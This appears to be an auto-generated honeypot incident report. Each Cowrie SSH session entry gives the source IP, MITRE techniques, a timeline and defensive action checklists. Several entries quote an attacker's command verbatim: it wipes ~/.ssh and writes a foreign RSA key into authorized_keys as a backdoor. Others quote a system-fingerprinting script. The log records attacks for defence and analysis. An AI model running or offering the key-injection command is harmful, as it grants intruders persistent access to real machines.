### 🔴 HIGH · IR-9738da7a6010

| Field | Detail |
|---|---|
| **Source IP** | `183.251.230[.]98` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:47` | `cowrie.session.connect` |
| `2026-09-21 17:46:47` | `cowrie.client.version` |
| `2026-09-21 17:46:48` | `cowrie.client.kex` |
| `2026-09-21 17:46:49` | `cowrie.login.success` |
| `2026-09-21 17:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.251.230[.]98` to AbuseIPDB if not already reported
- [ ] Block `183.251.230[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-685e59c917f9

| Field | Detail |
|---|---|
| **Source IP** | `183.251.230[.]98` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:49` | `cowrie.session.connect` |
| `2026-09-21 17:46:49` | `cowrie.client.version` |
| `2026-09-21 17:46:49` | `cowrie.client.kex` |
| `2026-09-21 17:46:51` | `cowrie.login.success` |
| `2026-09-21 17:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.251.230[.]98` to AbuseIPDB if not already reported
- [ ] Block `183.251.230[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-754b0d489bdb

| Field | Detail |
|---|---|
| **Source IP** | `163.7.11[.]155` |
| **First Seen** | 2026-09-21 17:49 |
| **Last Seen** | 2026-09-21 17:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:49:17` | `cowrie.session.connect` |
| `2026-09-21 17:49:17` | `cowrie.client.version` |
| `2026-09-21 17:49:18` | `cowrie.client.kex` |
| `2026-09-21 17:49:19` | `cowrie.login.success` |
| `2026-09-21 17:49:20` | `cowrie.session.params` |
| `2026-09-21 17:49:20` | `cowrie.command.input` |
| `2026-09-21 17:49:20` | `cowrie.command.failed` |
| `2026-09-21 17:49:20` | `cowrie.log.closed` |
| `2026-09-21 17:49:21` | `cowrie.session.params` |
| `2026-09-21 17:49:21` | `cowrie.command.input` |
| `2026-09-21 17:49:21` | `cowrie.session.file_download` |
| `2026-09-21 17:49:22` | `cowrie.log.closed` |
| `2026-09-21 17:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.11[.]155` to AbuseIPDB if not already reported
- [ ] Block `163.7.11[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3afb68075d9

| Field | Detail |
|---|---|
| **Source IP** | `163.7.11[.]155` |
| **First Seen** | 2026-09-21 17:49 |
| **Last Seen** | 2026-09-21 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:49:23` | `cowrie.session.connect` |
| `2026-09-21 17:49:23` | `cowrie.client.version` |
| `2026-09-21 17:49:24` | `cowrie.client.kex` |
| `2026-09-21 17:49:25` | `cowrie.login.success` |
| `2026-09-21 17:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.11[.]155` to AbuseIPDB if not already reported
- [ ] Block `163.7.11[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5958fd91206

| Field | Detail |
|---|---|
| **Source IP** | `163.7.11[.]155` |
| **First Seen** | 2026-09-21 17:49 |
| **Last Seen** | 2026-09-21 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:49:27` | `cowrie.session.connect` |
| `2026-09-21 17:49:27` | `cowrie.client.version` |
| `2026-09-21 17:49:28` | `cowrie.client.kex` |
| `2026-09-21 17:49:29` | `cowrie.login.success` |
| `2026-09-21 17:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.11[.]155` to AbuseIPDB if not already reported
- [ ] Block `163.7.11[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5409cf9431a7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:15 |
| **Last Seen** | 2026-09-21 18:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:15:45` | `cowrie.session.connect` |
| `2026-09-21 18:15:46` | `cowrie.client.version` |
| `2026-09-21 18:15:46` | `cowrie.client.kex` |
| `2026-09-21 18:15:48` | `cowrie.login.success` |
| `2026-09-21 18:15:50` | `cowrie.session.params` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.success` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:50` | `cowrie.command.input` |
| `2026-09-21 18:15:51` | `cowrie.log.closed` |
| `2026-09-21 18:15:53` | `cowrie.session.params` |
| `2026-09-21 18:15:53` | `cowrie.command.input` |
| `2026-09-21 18:15:54` | `cowrie.log.closed` |
| `2026-09-21 18:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d4e463ac47

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-21 18:16 |
| **Last Seen** | 2026-09-21 18:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:16:29` | `cowrie.session.connect` |
| `2026-09-21 18:16:29` | `cowrie.client.version` |
| `2026-09-21 18:16:29` | `cowrie.client.kex` |
| `2026-09-21 18:16:30` | `cowrie.login.success` |
| `2026-09-21 18:16:31` | `cowrie.session.params` |
| `2026-09-21 18:16:31` | `cowrie.command.input` |
| `2026-09-21 18:16:31` | `cowrie.command.failed` |
| `2026-09-21 18:16:31` | `cowrie.log.closed` |
| `2026-09-21 18:16:31` | `cowrie.session.params` |
| `2026-09-21 18:16:31` | `cowrie.command.input` |
| `2026-09-21 18:16:31` | `cowrie.session.file_download` |
| `2026-09-21 18:16:31` | `cowrie.log.closed` |
| `2026-09-21 18:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aacb866738d

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-21 18:16 |
| **Last Seen** | 2026-09-21 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:16:32` | `cowrie.session.connect` |
| `2026-09-21 18:16:32` | `cowrie.client.version` |
| `2026-09-21 18:16:32` | `cowrie.client.kex` |
| `2026-09-21 18:16:32` | `cowrie.login.success` |
| `2026-09-21 18:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95adee1ed898

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-21 18:16 |
| **Last Seen** | 2026-09-21 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:16:32` | `cowrie.session.connect` |
| `2026-09-21 18:16:32` | `cowrie.client.version` |
| `2026-09-21 18:16:32` | `cowrie.client.kex` |
| `2026-09-21 18:16:33` | `cowrie.login.success` |
| `2026-09-21 18:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0481b7f15a6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:17 |
| **Last Seen** | 2026-09-21 18:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:17:54` | `cowrie.session.connect` |
| `2026-09-21 18:17:54` | `cowrie.client.version` |
| `2026-09-21 18:17:54` | `cowrie.client.kex` |
| `2026-09-21 18:17:57` | `cowrie.login.success` |
| `2026-09-21 18:17:59` | `cowrie.session.params` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.success` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.command.input` |
| `2026-09-21 18:17:59` | `cowrie.log.closed` |
| `2026-09-21 18:18:01` | `cowrie.session.params` |
| `2026-09-21 18:18:01` | `cowrie.command.input` |
| `2026-09-21 18:18:01` | `cowrie.log.closed` |
| `2026-09-21 18:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f9f5c21c47

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:19 |
| **Last Seen** | 2026-09-21 18:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:19:51` | `cowrie.session.connect` |
| `2026-09-21 18:19:51` | `cowrie.client.version` |
| `2026-09-21 18:19:51` | `cowrie.client.kex` |
| `2026-09-21 18:19:52` | `cowrie.login.success` |
| `2026-09-21 18:19:53` | `cowrie.session.params` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.success` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.command.input` |
| `2026-09-21 18:19:53` | `cowrie.log.closed` |
| `2026-09-21 18:19:54` | `cowrie.session.params` |
| `2026-09-21 18:19:54` | `cowrie.command.input` |
| `2026-09-21 18:19:54` | `cowrie.log.closed` |
| `2026-09-21 18:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d321899f37a6

| Field | Detail |
|---|---|
| **Source IP** | `65.109.206[.]127` |
| **First Seen** | 2026-09-21 18:19 |
| **Last Seen** | 2026-09-21 18:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:19:57` | `cowrie.session.connect` |
| `2026-09-21 18:19:57` | `cowrie.client.version` |
| `2026-09-21 18:19:57` | `cowrie.client.kex` |
| `2026-09-21 18:19:58` | `cowrie.login.success` |
| `2026-09-21 18:19:58` | `cowrie.session.params` |
| `2026-09-21 18:19:58` | `cowrie.command.input` |
| `2026-09-21 18:19:58` | `cowrie.command.failed` |
| `2026-09-21 18:19:59` | `cowrie.log.closed` |
| `2026-09-21 18:19:59` | `cowrie.session.params` |
| `2026-09-21 18:19:59` | `cowrie.command.input` |
| `2026-09-21 18:19:59` | `cowrie.session.file_download` |
| `2026-09-21 18:19:59` | `cowrie.log.closed` |
| `2026-09-21 18:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.109.206[.]127` to AbuseIPDB if not already reported
- [ ] Block `65.109.206[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acfaaa0161cf

| Field | Detail |
|---|---|
| **Source IP** | `65.109.206[.]127` |
| **First Seen** | 2026-09-21 18:20 |
| **Last Seen** | 2026-09-21 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:20:00` | `cowrie.session.connect` |
| `2026-09-21 18:20:00` | `cowrie.client.version` |
| `2026-09-21 18:20:00` | `cowrie.client.kex` |
| `2026-09-21 18:20:00` | `cowrie.login.success` |
| `2026-09-21 18:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.109.206[.]127` to AbuseIPDB if not already reported
- [ ] Block `65.109.206[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d818f6dfc6

| Field | Detail |
|---|---|
| **Source IP** | `65.109.206[.]127` |
| **First Seen** | 2026-09-21 18:20 |
| **Last Seen** | 2026-09-21 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:20:00` | `cowrie.session.connect` |
| `2026-09-21 18:20:00` | `cowrie.client.version` |
| `2026-09-21 18:20:01` | `cowrie.client.kex` |
| `2026-09-21 18:20:01` | `cowrie.login.success` |
| `2026-09-21 18:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.109.206[.]127` to AbuseIPDB if not already reported
- [ ] Block `65.109.206[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ef4e476482

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:23 |
| **Last Seen** | 2026-09-21 18:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:23:28` | `cowrie.session.connect` |
| `2026-09-21 18:23:29` | `cowrie.client.version` |
| `2026-09-21 18:23:29` | `cowrie.client.kex` |
| `2026-09-21 18:23:33` | `cowrie.login.success` |
| `2026-09-21 18:23:35` | `cowrie.session.params` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:35` | `cowrie.command.success` |
| `2026-09-21 18:23:35` | `cowrie.command.input` |
| `2026-09-21 18:23:36` | `cowrie.command.input` |
| `2026-09-21 18:23:36` | `cowrie.command.input` |
| `2026-09-21 18:23:36` | `cowrie.command.input` |
| `2026-09-21 18:23:37` | `cowrie.log.closed` |
| `2026-09-21 18:23:39` | `cowrie.session.params` |
| `2026-09-21 18:23:39` | `cowrie.command.input` |
| `2026-09-21 18:23:41` | `cowrie.log.closed` |
| `2026-09-21 18:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ba7fe2e273

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:24 |
| **Last Seen** | 2026-09-21 18:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:24:42` | `cowrie.session.connect` |
| `2026-09-21 18:24:43` | `cowrie.client.version` |
| `2026-09-21 18:24:43` | `cowrie.client.kex` |
| `2026-09-21 18:24:47` | `cowrie.login.success` |
| `2026-09-21 18:24:50` | `cowrie.session.params` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.success` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:50` | `cowrie.command.input` |
| `2026-09-21 18:24:51` | `cowrie.log.closed` |
| `2026-09-21 18:24:54` | `cowrie.session.params` |
| `2026-09-21 18:24:54` | `cowrie.command.input` |
| `2026-09-21 18:24:55` | `cowrie.log.closed` |
| `2026-09-21 18:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ebef215789

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:26 |
| **Last Seen** | 2026-09-21 18:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:26:09` | `cowrie.session.connect` |
| `2026-09-21 18:26:09` | `cowrie.client.version` |
| `2026-09-21 18:26:10` | `cowrie.client.kex` |
| `2026-09-21 18:26:11` | `cowrie.login.success` |
| `2026-09-21 18:26:12` | `cowrie.session.params` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
